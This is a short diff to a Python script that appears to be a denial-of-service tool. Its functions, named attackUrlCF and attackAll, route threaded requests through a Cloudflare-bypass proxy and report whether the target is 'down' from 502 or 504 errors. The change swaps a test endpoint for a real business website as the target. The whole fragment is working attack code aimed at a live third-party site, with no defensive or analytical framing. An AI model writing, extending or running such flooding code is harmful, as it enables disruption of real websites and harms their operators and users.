@@ -112,7 +112,6 @@ def attackUrlCF(baseUrl, threadNumber):
 				if str(r.status_code) in ['502', '504']:					
 					isClear = False
 			if isClear:
-				print(res[0].content)
 				print('threadNum: ' + str(threadNumber), 'up.....')
 			else:
 				print(str(threadNumber), 'down!!!!!')
@@ -136,7 +135,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://api.ipify.org', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
